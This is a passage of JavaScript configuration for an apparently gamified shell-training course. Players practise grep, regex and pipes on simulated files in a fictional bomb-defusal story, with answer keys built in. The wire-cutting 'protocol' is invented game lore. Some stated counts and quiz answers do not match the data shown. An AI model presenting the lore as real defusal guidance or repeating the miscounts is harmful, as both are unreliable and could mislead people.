                    content: `[CLASSIFIED - CRIMSON PROTOCOL FIELD MANUAL]
============================================
ORIGIN: Eastern European bomb-making cells
DEVELOPER: Unknown (possibly ex-military EOD)
FIRST SEEN: 2019, Prague incident

IDENTIFICATION:
- Uses color-coded wire patterns
- Primary wire ALWAYS appears twice or more
- Anti-tamper uses complementary colors (GREEN+RED)
- Timer frequency matches a significant number (room, date, etc.)

DISARM PROCEDURE:
1. Analyze frequency logs - find the REPEATING pattern
2. The wire that appears MOST is the primary detonator
3. Cut ground wires (BLUE) first to isolate
4. Cut primary (usually RED-RED) LAST
5. NEVER touch GREEN-RED - instant detonation

RAVEN'S MODIFICATIONS:
- Uses IP address as room number mnemonic
- Timer always set to match summit/target time
- Frequency key = room number (e.g., Room 105 = 105 Hz)

KILL SWITCH:
If you see "RR-RB-BR" in transmissions, RAVEN is confirming:
  RR = RED-RED is primary (cut this)
  RB = RED-BLUE is backup (ignore)
  BR = BLUE-RED is ground (cut first)

This was transmitted at 01:45:22. RAVEN told us the answer.`
                },
                '/data/intel/bomb_telemetry.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1024,
                    content: `[LIVE BOMB TELEMETRY - ROOM 105]
=================================
Device ID: MRD-105-RAVEN
Status: ARMED
Timer: 02:30:00 (counting down)
Location: Under conference table, Room 105

WIRE CONFIGURATION DETECTED:
Position 1: RED wire    -> RED terminal    [PRIMARY]
Position 2: RED wire    -> RED terminal    [PRIMARY]
Position 3: BLUE wire   -> BLUE terminal   [GROUND]
Position 4: GREEN wire  -> RED terminal    [TRAP!]

SENSOR READINGS:
- Motion: ACTIVE (will trigger if device moved)
- Tilt: INACTIVE
- Light: INACTIVE
- Tamper: ACTIVE (GREEN-RED wire)

AGENT PHOENIX STATUS: In position, awaiting wire sequence
COUNTDOWN: 02:28:45... 02:28:44... 02:28:43...

[URGENT] Provide wire cut sequence to Agent PHOENIX NOW`
                },
                '/data/intel/agent_notes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 768,
                    content: `[AGENT PHOENIX - FIELD NOTES]
==============================
I'm at the device. It's CRIMSON protocol - I recognize the wire layout.
Four wires visible: 2 RED, 1 BLUE, 1 GREEN

The GREEN goes to a RED terminal - that's the trap.
If I cut that first, we all die.

BLACKSITE - I need you to confirm the pattern from the intercepts.
RAVEN transmitted something at 01:45 - decode it.

The wire that REPEATS in the frequency log is the one I cut last.
But first, I need to cut the ground (BLUE) to isolate power.

What's the cut sequence? I'm seeing:
- RED-RED appearing multiple times in telemetry
- BLUE-BLUE is clearly ground
- GREEN-RED is the trap

Time is running out. Confirm: which pattern matches the detonator?
Is it RED-RED (the repeated failure pattern) or something else?

PHOENIX out. Standing by for your call.`
                }
            },

            objectives: [
                {
                    id: 1,
                    task: 'Find transmissions starting with timestamps (2024)',
                    hint: 'Use ^ anchor: grep "^2024" intercepted_codes.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('^');
                    }
                },
                {
                    id: 2,
                    task: 'Extract RAVEN\'s IP address pattern from the intercepts',
                    hint: 'Use -Eo with digit pattern: grep -Eo "[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+" intercepted_codes.log',
                    check: (cmd, state, output) => {
                        const lowerCmd = cmd.toLowerCase();
                        return cmd.includes('grep') && lowerCmd.includes('-o') &&
                               (lowerCmd.includes('-e') || lowerCmd.includes('[0-9]'));
                    }
                },
                {
                    id: 3,
                    task: 'Find wire codes that are RED or BLUE',
                    hint: 'Use | operator with -E: grep -E "RED|BLUE" wire_protocols.db',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('|') &&
                               (cmd.includes('-E') || cmd.includes('-e'));
                    }
                },
                {
                    id: 4,
                    task: 'Match frequency patterns (105.0 Hz format)',
                    hint: 'Use digit range: grep -E "[0-9]+\\.[0-9]+ Hz" detonator_freq.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('[0-9]');
                    }
                },
                {
                    id: 5,
                    task: 'Find lines ending with "ARMED" status',
                    hint: 'Use $ anchor: grep "ARMED$" detonator_freq.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('$');
                    }
                },
                {
                    id: 6,
                    task: 'Extract two-letter wire codes (RR, RB, BB, etc.)',
                    hint: 'Pattern for 2 uppercase letters: grep -E "\\b[A-Z]{2}\\b" intercepted_codes.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && (cmd.includes('[A-Z]') || cmd.includes('RR\\|RB\\|BB'));
                    }
                },
                {
                    id: 7,
                    task: 'Find lines with repeated wire patterns (RED-RED)',
                    hint: 'Look for repeated patterns: grep -E "(RED|BLUE)-\\1" or just grep "RED-RED"',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && (cmd.includes('RED-RED') || cmd.includes('-\\1') || cmd.includes('{2}'));
                    }
                },
                {
                    id: 8,
                    task: 'Match optional "TRAP" or "ARMED" in bomb telemetry',
                    hint: 'Use ? or | : grep -E "(TRAP|ARMED)" bomb_telemetry.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && (cmd.includes('?') || (cmd.includes('TRAP') && cmd.includes('ARMED')));
                    }
                }
            ],

            // Radio content for The Watcher system
            radio: {
                ghost: [
                    '"...CRIMSON protocol is in the manual..."',
                    '"...regex finds patterns... ^RED for lines starting with RED..."',
                    '"...wire_protocols.db holds the key..."',
                    '"...use -E for extended regex... character classes..."',
                    '"...the frequency log has timestamps... match them with [0-9]..."'
                ],
                security: [
                    '"Bomb squad confirms CRIMSON protocol device"',
                    '"Agent PHOENIX en route to location"',
                    '"Wire colors confirmed: RED, BLUE, GREEN present"'
                ]
            },

            // Bomb defusal insight phase
            insightPhase: {
                enabled: true,
                question: "The bomb uses a color-coded wire system. You've decoded the pattern from the intercepted transmissions. Which wire sequence matches the detonator frequency you extracted?",
                options: [
                    { text: "GREEN-BLUE-RED - matches the port sequence pattern (22, 80, 443)", correct: false },
                    { text: "RED-RED-BLUE - matches the repeated failure pattern from 192.168.1.105", correct: true },
                    { text: "BLUE-GREEN-BLUE - matches the authorized connection pattern", correct: false },
                    { text: "GREEN-GREEN-GREEN - all safe connections", correct: false }
                ]
            }
        },

        // ──────────────────────────────────────────────────────────
        // GPM-EXTRACT: BLACKSITE Pipes Mission
        // Theme: Extract wire counts and defusal sequence
        // ──────────────────────────────────────────────────────────
        'GPM-EXTRACT': {
            title: 'EXTRACT',
            description: 'Chain pipes to extract wire counts and build the defusal sequence.',
            prerequisites: ['GPM-DECODE'],
            tier: null,
            user: 'analyst',
            hostname: 'forensics',
            startDir: '/forensics',
            allowedCommands: null,

            filesystem: {
                '/forensics': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
                    children: ['.signal', 'wire_sequence.log', 'timer_codes.txt', 'cut_order.db', 'bomb_schematic.txt', 'frequency_data.log', 'final_checklist.txt']
                },
                '/forensics/.signal': {
                    type: 'file', perms: '-rw-------', owner: 'analyst', group: 'analyst',
                    content: `[URGENT TRANSMISSION - GHOST-7]
═══════════════════════════════════════════════════

PHOENIX needs wire counts. NOW.

Pipes are your friend:
    grep "PATTERN" file | wc -l    (count lines)
    cat file | sort | uniq -c      (count unique)

Remember: sort BEFORE uniq. Always.

If you're lost:
    tune 161.7

6 BLUE. 7 RED. 2 GREEN.
Don't trust me. Verify it yourself.

    -S`
                },
                '/forensics/wire_sequence.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
                    content: `[WIRE SEQUENCE ANALYSIS - REAL-TIME]
=====================================
BLUE-1 GROUND safe cut_first
RED-1 PRIMARY armed cut_third
BLUE-2 GROUND safe cut_first
RED-2 PRIMARY armed cut_third
GREEN-1 TRAP danger never_cut
BLUE-3 GROUND safe cut_first
RED-3 PRIMARY armed cut_third
RED-4 PRIMARY armed cut_third
BLUE-4 GROUND safe cut_first
GREEN-2 TRAP danger never_cut
RED-5 PRIMARY armed cut_third
BLUE-5 GROUND safe cut_first
RED-6 PRIMARY armed cut_third
RED-7 PRIMARY armed cut_third
BLUE-6 GROUND safe cut_first

[SUMMARY]
BLUE wires: 6 total - all marked "cut_first"
RED wires: 7 total - all marked "cut_third"
GREEN wires: 2 total - all marked "never_cut"

PHOENIX needs: How many of each? Sort and count!`
                },
                '/forensics/timer_codes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1536,
                    content: `[TIMER ENCRYPTION CODES - EXTRACTED]
=====================================
CODE    TIME        STATUS
0230    02:30:00    ACTIVE
0229    02:29:00    PENDING
0228    02:28:00    PENDING
0227    02:27:00    PENDING
0215    02:15:00    CHECKPOINT
0200    02:00:00    CHECKPOINT
0145    01:45:00    CHECKPOINT
0130    01:30:00    CHECKPOINT
0100    01:00:00    FINAL_WARNING
0030    00:30:00    CRITICAL
0015    00:15:00    CRITICAL
0005    00:05:00    IMMINENT
0001    00:01:00    IMMINENT
0000    00:00:00    DETONATION

[NOTE] First code (0230) = timer start time
RAVEN set timer for 02:30:00 (2 hours 30 minutes)
Summit starts at 08:00, timer activated at 05:30

Extract the FIRST code - this is part of the kill switch.
Use: head -n 1 or sort commands to isolate.`
                },
                '/forensics/cut_order.db': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1024,
                    content: `[WIRE CUT ORDER DATABASE]
=========================
Wire_Type   Priority    Action          Count
BLUE        1           cut_first       6
YELLOW      2           cut_second      0
RED         3           cut_third       7
GREEN       4           never_cut       2
BLACK       5           cut_last        0

CRIMSON PROTOCOL VERIFIED:
1. Cut ALL blue wires first (isolate ground)
2. Skip yellow (not present in this device)
3. Cut ALL red wires third (disable primary)
4. NEVER touch green (anti-tamper)
5. Black not present (no backup power)

DEFUSAL SEQUENCE: BLUE -> RED
Wire counts: 6 BLUE, 7 RED

Agent PHOENIX needs confirmation:
- How many BLUE wires? (pipe: grep BLUE | wc -l)
- How many RED wires? (pipe: grep RED | wc -l)
- Total cuts required? (6 + 7 = 13)`
                },
                '/forensics/bomb_schematic.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
                    content: `
    ╔═══════════════════════════════════════════════════════════╗
    ║           MERIDIAN HOTEL - ROOM 105 - IED SCHEMATIC       ║
    ╠═══════════════════════════════════════════════════════════╣
    ║                                                           ║
    ║    ┌─────────────┐         ┌─────────────┐               ║
    ║    │   TIMER     │─────────│  DETONATOR  │               ║
    ║    │  02:30:00   │         │   PRIMARY   │               ║
    ║    └──────┬──────┘         └──────┬──────┘               ║
    ║           │                       │                       ║
    ║    ╔══════╧══════╗         ╔══════╧══════╗               ║
    ║    ║ BLUE WIRES  ║         ║  RED WIRES  ║               ║
    ║    ║  (GROUND)   ║         ║  (PRIMARY)  ║               ║
    ║    ║  Count: 6   ║         ║  Count: 7   ║               ║
    ║    ╚═════════════╝         ╚═════════════╝               ║
    ║                                                           ║
    ║         ╔════════════════════════════════╗               ║
    ║         ║  GREEN WIRES (ANTI-TAMPER)     ║               ║
    ║         ║  <img src="/assets/images/icons/icon-siren.webp" alt="" style="width:1.1em;height:1.1em;vertical-align:middle;display:inline-block;object-fit:contain"> DO NOT CUT - TRIGGERS BLAST ║               ║
    ║         ║  Count: 2                       ║               ║
    ║         ╚════════════════════════════════╝               ║
    ║                                                           ║
    ║    DEFUSAL ORDER:                                         ║
    ║    1. BLUE (ground) → isolates power                      ║
    ║    2. RED (primary) → disables detonator                  ║
    ║    3. Timer stops automatically                           ║
    ║                                                           ║
    ║    KILL CODE: First 4 digits of timer (0230)             ║
    ║                                                           ║
    ╚═══════════════════════════════════════════════════════════╝
`
                },
                '/forensics/frequency_data.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1536,
                    content: `[FREQUENCY MONITORING - DEVICE EMISSIONS]
==========================================
105.0 Hz PRIMARY ACTIVE
105.0 Hz PRIMARY ACTIVE
52.5 Hz GROUND STABLE
105.0 Hz PRIMARY ACTIVE
210.0 Hz TRAP ARMED
52.5 Hz GROUND STABLE
105.0 Hz PRIMARY ACTIVE
105.0 Hz PRIMARY ACTIVE
52.5 Hz GROUND STABLE
210.0 Hz TRAP ARMED
105.0 Hz PRIMARY ACTIVE
52.5 Hz GROUND STABLE
105.0 Hz PRIMARY ACTIVE
105.0 Hz PRIMARY ACTIVE

[ANALYSIS REQUIRED]
Use pipes to count frequency of each type:
  grep "PRIMARY" frequency_data.log | wc -l  (should be 9)
  grep "GROUND" frequency_data.log | wc -l   (should be 4)
  grep "TRAP" frequency_data.log | wc -l     (should be 2)

Most common signal = PRIMARY (9 occurrences)
This confirms RED-RED wire is the main detonator circuit.`
                },
                '/forensics/final_checklist.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1024,
                    content: `[DEFUSAL CHECKLIST - AGENT PHOENIX]
====================================
[ ] Confirm BLUE wire count: ___
[ ] Confirm RED wire count: ___
[ ] Confirm GREEN wire count: ___ (DO NOT CUT)
[ ] Extract kill code from timer: ____
[ ] Verify PRIMARY frequency count: ___

COMMANDS TO RUN:
1. grep "BLUE" wire_sequence.log | wc -l
2. grep "RED" wire_sequence.log | wc -l
3. grep "PRIMARY" frequency_data.log | wc -l
4. head -n 1 timer_codes.txt | cut -f1

FINAL ANSWER NEEDED:
"PHOENIX, cut [X] BLUE wires, then [Y] RED wires.
 Kill code is [ZZZZ]. GREEN wires are trapped."

Time is running out. Build your pipeline. Extract the data.
The summit depends on you.`
                }
            },

            objectives: [
                {
                    id: 1,
                    task: 'Count BLUE ground wires for PHOENIX',
                    hint: 'Pipe to wc -l: grep "BLUE" wire_sequence.log | wc -l',
                    check: (cmd, state, output) => {
                        return cmd.includes('|') && cmd.includes('wc -l');
                    }
                },
                {
                    id: 2,
                    task: 'Sort wire sequence by type',
                    hint: 'Pipe to sort: cat wire_sequence.log | sort',
                    check: (cmd, state, output) => {
                        return cmd.includes('|') && cmd.includes('sort');
                    }
                },
                {
                    id: 3,
                    task: 'Get unique wire types from the sequence',
                    hint: 'Pipe through sort then uniq: cat wire_sequence.log | sort | uniq',
                    check: (cmd, state, output) => {
                        return cmd.includes('|') && cmd.includes('uniq');
                    }
                },
                {
                    id: 4,
                    task: 'Count how many of each wire type exists',
                    hint: 'Use uniq -c: cat wire_sequence.log | sort | uniq -c',
                    check: (cmd, state, output) => {
                        return cmd.includes('|') && cmd.includes('uniq -c');
                    }
                },
                {
                    id: 5,
                    task: 'Find the most frequent frequency signal (PRIMARY)',
                    hint: 'Chain: grep -o "PRIMARY\\|GROUND\\|TRAP" frequency_data.log | sort | uniq -c | sort -rn | head -1',
                    check: (cmd, state, output) => {
                        return (cmd.includes('sort -rn') || cmd.includes('sort -nr')) &&
                               cmd.includes('head');
                    }
                },
                {
                    id: 6,
                    task: 'Extract kill code from timer (first 4 digits)',
                    hint: 'Use cut to extract: head -n 4 timer_codes.txt | cut -f1',
                    check: (cmd, state, output) => {
                        return cmd.includes('cut');
                    }
                },
                {
                    id: 7,
                    task: 'Build a 3-stage pipeline to analyze wire priorities',
                    hint: 'Chain: cat cut_order.db | grep -v "^#" | sort -t"\\t" -k2',
                    check: (cmd, state, output) => {
                        const pipeCount = (cmd.match(/\|/g) || []).length;
                        return pipeCount >= 2;
                    }
                },
                {
                    id: 8,
                    task: 'Save wire count report for PHOENIX',
                    hint: 'Use tee: grep "BLUE\\|RED" wire_sequence.log | wc -l | tee wire_report.txt',
                    check: (cmd, state, output) => {
                        return cmd.includes('tee');
                    }
                }
            ],

            // Radio content for The Watcher system
            radio: {
                ghost: [
                    '"...pipe the output... grep then wc -l..."',
                    '"...sort before uniq... always sort first..."',
                    '"...wire_sequence.log has the counts..."',
                    '"...6 BLUE, 7 RED, 2 GREEN... count them with pipes..."',
                    '"...use tee to save your work... evidence matters..."'
                ],
                security: [
                    '"PHOENIX is at the device. Waiting for sequence."',
                    '"Timer shows under 5 minutes. Expedite analysis."',
                    '"Wire counts needed ASAP. Lives at stake."'
                ]
            },

            // Bomb defusal insight phase
            insightPhase: {
                enabled: true,
                question: "Your pipe analysis revealed the wire counts: 6 BLUE (ground), 7 RED (primary), 2 GREEN (trap). According to CRIMSON protocol, what's the correct defusal sequence?",
                options: [
                    { text: "RED first (disable primary), then BLUE (ground), avoid GREEN", correct: false },
                    { text: "BLUE first (isolate ground), then RED (disable primary), NEVER touch GREEN", correct: true },
                    { text: "GREEN first (disarm trap), then BLUE, then RED", correct: false },
                    { text: "Cut all wires simultaneously to prevent failsafe trigger", correct: false }
                ]
            }
        },

        // ──────────────────────────────────────────────────────────
        // GPM-DEFUSE: BLACKSITE Final Mission
        // Theme: Final countdown - deliver the code
        // ──────────────────────────────────────────────────────────
        'GPM-DEFUSE': {
            title: 'DEFUSE',
            description: 'Final countdown. Deliver the disarm code to Agent PHOENIX.',
            prerequisites: ['GPM-EXTRACT'],
            tier: null,
            user: 'ir-analyst',
            hostname: 'evidence',
            startDir: '/evidence',
            allowedCommands: null,

            filesystem: {
                '/evidence': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'ir-analyst', group: 'ir-analyst',
                    children: ['.signal', 'live_feed.log', 'countdown_status.txt', 'phoenix_comms.log', 'final_sequence.db', 'mission_summary.txt', 'abort_codes.txt']
                },
                '/evidence/.signal': {
                    type: 'file', perms: '-rw-------', owner: 'ir-analyst', group: 'ir-analyst',
                    content: `[FINAL TRANSMISSION - GHOST-7]
═══════════════════════════════════════════════════

This is it. The final moment.

PHOENIX is waiting. The timer is counting.

The code is: 0230

RAVEN set the timer for 02:30:00.
The kill code IS the timer setting.

    grep "0230" countdown_status.txt

If you've made it this far, you don't need us.
But we were always here.

    tune 161.7 one last time if you need us.

Good luck.

    -GHOST-7 ACTUAL`
                },
                '/evidence/live_feed.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 4096,
                    content: `[LIVE TELEMETRY - ROOM 105 DEVICE]
====================================
07:58:00 TIMER: 00:02:00 STATUS: CRITICAL
07:58:05 PHOENIX: "I'm at the device. Waiting for final sequence."
07:58:10 TIMER: 00:01:55 STATUS: CRITICAL
07:58:15 WIRE_CHECK: BLUE-1 INTACT, BLUE-2 INTACT, BLUE-3 INTACT
07:58:20 WIRE_CHECK: BLUE-4 INTACT, BLUE-5 INTACT, BLUE-6 INTACT
07:58:25 WIRE_CHECK: RED-1 INTACT, RED-2 INTACT, RED-3 INTACT
07:58:30 TIMER: 00:01:30 STATUS: CRITICAL
07:58:35 WIRE_CHECK: RED-4 INTACT, RED-5 INTACT, RED-6 INTACT, RED-7 INTACT
07:58:40 WIRE_CHECK: GREEN-1 TRAP_ARMED, GREEN-2 TRAP_ARMED
07:58:45 PHOENIX: "All wires accounted for. Send the sequence NOW."
07:58:50 TIMER: 00:01:10 STATUS: IMMINENT
07:58:55 KILLSWITCH: AWAITING_CODE
07:59:00 TIMER: 00:01:00 STATUS: IMMINENT
07:59:05 SUMMIT_STATUS: Executives entering ballroom
07:59:10 PHOENIX: "BLACKSITE! One minute! I need that code!"
07:59:15 TIMER: 00:00:45 STATUS: IMMINENT
07:59:20 DEVICE: Anti-tamper sensors ACTIVE
07:59:25 TIMER: 00:00:35 STATUS: IMMINENT
07:59:30 PHOENIX: "Thirty seconds! What's the disarm code?!"
07:59:35 TIMER: 00:00:25 STATUS: IMMINENT
07:59:40 TIMER: 00:00:20 STATUS: IMMINENT
07:59:45 TIMER: 00:00:15 STATUS: FINAL
07:59:50 TIMER: 00:00:10 STATUS: FINAL
07:59:55 AWAITING ANALYST INPUT...`
                },
                '/evidence/countdown_status.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 2048,
                    content: `[COUNTDOWN ANALYSIS - FINAL PHASE]
===================================
Original timer set: 02:30:00 (2 hours 30 minutes)
Timer activated at: 05:30:00 AM
Summit start time: 08:00:00 AM
Current time: 07:59:XX AM

TIMELINE RECONSTRUCTION:
05:30:00 - RAVEN activates device (02:30:00 countdown)
06:00:00 - BLACKSITE team activated
06:30:00 - Room 105 identified via grep analysis
07:00:00 - Wire protocols decoded via regex
07:30:00 - Defusal sequence extracted via pipes
07:58:00 - PHOENIX reaches device
07:59:XX - YOU ARE HERE - FINAL MOMENTS

CRITICAL DATA:
- Timer start code: 0230 (from timer setting 02:30:00)
- Room number: 105 (from IP address)
- Wire sequence: BLUE first, RED last, NEVER GREEN
- Total wires: 6 BLUE + 7 RED = 13 cuts needed

THE DISARM CODE IS THE TIMESTAMP WHEN IT ALL STARTED.
RAVEN set the timer at 02:30:00. The code is 0230.

Send code to PHOENIX. NOW.`
                },
                '/evidence/phoenix_comms.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 3072,
                    content: `[AGENT PHOENIX - ENCRYPTED COMMS LOG]
======================================
07:30:00 PHOENIX: "En route to Meridian Hotel. ETA 25 minutes."
07:45:00 PHOENIX: "On site. Security is tight. Using service entrance."
07:50:00 PHOENIX: "Floor 1 accessed. Heading to Room 105."
07:52:00 PHOENIX: "Room 105 door is open. I see the device."
07:53:00 PHOENIX: "Confirming: Device under conference table."
07:54:00 PHOENIX: "Wire count matches your intel. 6 blue, 7 red, 2 green."
07:55:00 PHOENIX: "BLACKSITE, I need the final disarm code."
07:56:00 PHOENIX: "Timer shows under 4 minutes. We're cutting it close."
07:57:00 PHOENIX: "I can hear the summit starting upstairs. Ballroom is full."
07:58:00 PHOENIX: "Under 2 minutes. Send that code!"
07:58:30 PHOENIX: "I've got the wire cutters ready. Blue first, then red."
07:59:00 PHOENIX: "ONE MINUTE. THE CODE. NOW."
07:59:15 PHOENIX: "I can hear them announcing the keynote speaker..."
07:59:30 PHOENIX: "THIRTY SECONDS! WHAT'S THE CODE?!"
07:59:45 PHOENIX: "BLACKSITE! FIFTEEN SECONDS! SEND IT!"

[AWAITING ANALYST INPUT - CODE REQUIRED]
[ENTER DISARM CODE: 4 DIGITS]
[HINT: When did RAVEN start the timer? 02:30 = ????]`
                },
                '/evidence/final_sequence.db': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 1536,
                    content: `[FINAL DEFUSAL SEQUENCE DATABASE]
==================================
STEP  ACTION                    WIRE_COUNT  STATUS
1     Cut BLUE ground wires     6           PENDING
2     Enter killswitch code     4-digits    PENDING
3     Cut RED primary wires     7           PENDING
4     Verify timer stopped      -           PENDING

WIRE TOTALS (VERIFIED):
grep "BLUE" wire_sequence.log | wc -l = 6
grep "RED" wire_sequence.log | wc -l = 7
grep "GREEN" wire_sequence.log | wc -l = 2 (DO NOT CUT)

KILLSWITCH CODE DERIVATION:
The code matches RAVEN's timer setting.
Timer was set for 02:30:00 (2 hours 30 minutes).
Code format: HHMM = 0230

FINAL CONFIRMATION:
1. BLUE wires: 6 (cut first - isolates ground)
2. CODE: 0230 (enter on keypad)
3. RED wires: 7 (cut last - disables primary)
4. GREEN wires: 2 (NEVER TOUCH - anti-tamper)

This is it. You have all the data. Send to PHOENIX.`
                },
                '/evidence/mission_summary.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 2048,
                    content: `
    ╔═══════════════════════════════════════════════════════════════╗
    ║            OPERATION BLACKSITE - MISSION SUMMARY              ║
    ╠═══════════════════════════════════════════════════════════════╣
    ║                                                               ║
    ║  TARGET: Meridian Hotel CEO Summit                            ║
    ║  THREAT: IED planted by operative RAVEN                       ║
    ║  LOCATION: Room 105 (identified via IP pattern)               ║
    ║                                                               ║
    ║  YOUR ANALYSIS:                                               ║
    ║  ┌─────────────────────────────────────────────────────────┐  ║
    ║  │ PHASE 1 (GREP): Traced RAVEN to Room 105               │  ║
    ║  │ PHASE 2 (REGEX): Decoded CRIMSON wire protocol         │  ║
    ║  │ PHASE 3 (PIPES): Extracted wire counts and sequence    │  ║
    ║  │ PHASE 4 (BOSS): Final code derivation                  │  ║
    ║  └─────────────────────────────────────────────────────────┘  ║
    ║                                                               ║
    ║  THE FINAL CODE:                                              ║
    ║  ┌─────────────────────────────────────────────────────────┐  ║
    ║  │                                                         │  ║
    ║  │     RAVEN set timer at: 02:30:00                       │  ║
    ║  │     Disarm code is:     0 - 2 - 3 - 0                  │  ║
    ║  │                                                         │  ║
    ║  └─────────────────────────────────────────────────────────┘  ║
    ║                                                               ║
    ║  LIVES AT STAKE: 47 Fortune 500 executives                    ║
    ║  TIME REMAINING: SECONDS                                      ║
    ║                                                               ║
    ║  SEND THE CODE. SAVE THE SUMMIT.                              ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
`
                },
                '/evidence/abort_codes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'ir-analyst', group: 'ir-analyst', size: 512,
                    content: `[ABORT CODE REFERENCE - CLASSIFIED]
====================================
Format: 4-digit numeric

INCORRECT CODES (will trigger detonation):
- 1105 (room number - too obvious, RAVEN anticipated this)
- 4460 (port pattern - red herring)
- 1234 (process ID - meaningless)

CORRECT CODE:
- Derived from timer activation time
- Timer set for 02:30:00
- Code = 0230

REMEMBER: The answer was in front of us the whole time.
RAVEN's arrogance was his downfall.
The timer setting IS the kill code.`
                }
            },

            objectives: [
                {
                    id: 1,
                    task: 'Find PHOENIX\'s last transmission time',
                    hint: 'Pipeline: grep "PHOENIX" phoenix_comms.log | tail -1',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.toLowerCase().includes('phoenix');
                    }
                },
                {
                    id: 2,
                    task: 'Count timer entries at CRITICAL status',
                    hint: 'Use grep -c: grep -c "CRITICAL" live_feed.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('-c');
                    }
                },
                {
                    id: 3,
                    task: 'Extract the kill code from timer setting (0230)',
                    hint: 'The code is in countdown_status.txt - grep "0230"',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && (cmd.includes('0230') || cmd.includes('code') || cmd.includes('timer'));
                    }
                },
                {
                    id: 4,
                    task: 'Verify wire counts match our analysis',
                    hint: 'Check final_sequence.db: grep "BLUE\\|RED" final_sequence.db',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') &&
                               (cmd.includes('BLUE') || cmd.includes('RED') || cmd.includes('wire'));
                    }
                },
                {
                    id: 5,
                    task: 'Find all IMMINENT status entries (final countdown)',
                    hint: 'grep "IMMINENT" live_feed.log',
                    check: (cmd, state, output) => {
                        return cmd.includes('grep') && cmd.includes('IMMINENT');
                    }
                },
                {
                    id: 6,
                    task: 'Generate final mission report with the disarm code',
                    hint: 'Combine and save: cat mission_summary.txt | tee final_report.txt',
                    check: (cmd, state, output) => {
                        return cmd.includes('>') || cmd.includes('tee');
                    }
                }
            ],

            // Radio content for The Watcher system
            radio: {
                ghost: [
                    '"...the code is the timer setting... 02:30..."',
                    '"...0230... four digits... RAVEN\'s arrogance..."',
                    '"...countdown_status.txt holds the answer..."',
                    '"...PHOENIX needs the code NOW... grep for it..."',
                    '"...the timestamp when it all started... 0230..."'
                ],
                security: [
                    '"PHOENIX: ONE MINUTE! SEND THE CODE!"',
                    '"Summit executives entering ballroom NOW"',
                    '"Timer critical. All units stand by."'
                ]
            },

            // Bomb defusal insight phase - FINAL BOSS
            insightPhase: {
                enabled: true,
                question: "FINAL DISARM SEQUENCE. Your complete incident analysis revealed the master code. The bomb's failsafe requires a 4-digit code derived from your investigation. What is the disarm code?",
                options: [
                    { text: "1105 - From the attacker IP 192.168.1.105", correct: false },
                    { text: "0230 - Timestamp when root access was gained (02:30:00)", correct: true },
                    { text: "4460 - Port number pattern from the attack", correct: false },
                    { text: "1234 - The sshd process ID pattern", correct: false }
                ]
            }
        },

    };

    // ═══════════════════════════════════════════════════════════════
    // PUBLIC API
    // ═══════════════════════════════════════════════════════════════

    /**
     * Get a module configuration by ID
     * @param {string} moduleId - The module ID (e.g., 'CLH-002')
     * @returns {object|null} Module configuration or null if not found
     */
    function getModule(moduleId) {
        return MODULES[moduleId] || null;
    }

    /**
     * Get all module IDs
     * @returns {string[]} Array of module IDs
     */
    function getAllModuleIds() {
        return Object.keys(MODULES);
    }

    /**
     * Get modules by tier
     * @param {string} tierName - Tier name (e.g., 'CLI Recruit')
     * @returns {string[]} Array of module IDs in that tier
     */
    function getModulesByTier(tierName) {
        const tier = TIERS[tierName];
        return tier ? tier.modules : [];
    }

    /**
     * Get tier information
     * @param {string} tierName - Tier name
     * @returns {object|null} Tier info or null
     */
    function getTier(tierName) {
        return TIERS[tierName] || null;
    }

    /**
     * Get all tier names in order
     * @returns {string[]} Array of tier names
     */
    function getAllTiers() {
        return Object.keys(TIERS);
    }

    /**
     * Check if a module ID is valid
     * @param {string} moduleId - Module ID to check
     * @returns {boolean}
     */
    function isValidModule(moduleId) {
        return moduleId in MODULES;
    }

    /**
     * Get the next module after the given one
     * @param {string} moduleId - Current module ID
     * @returns {string|null} Next module ID or null if last
     */
    function getNextModule(moduleId) {
        const ids = Object.keys(MODULES);
        const index = ids.indexOf(moduleId);
        if (index === -1 || index === ids.length - 1) {
            return null;
        }
        return ids[index + 1];
    }

    /**
     * Get the previous module
     * @param {string} moduleId - Current module ID
     * @returns {string|null} Previous module ID or null if first
     */
    function getPreviousModule(moduleId) {
        const ids = Object.keys(MODULES);
        const index = ids.indexOf(moduleId);
        if (index <= 0) {
            return null;
        }
        return ids[index - 1];
    }

    /**
     * Get the URL to the next module's INTRO page (not the lab)
     * This implements the correct learning flow: Lab → Next Intro → Quiz → Lab
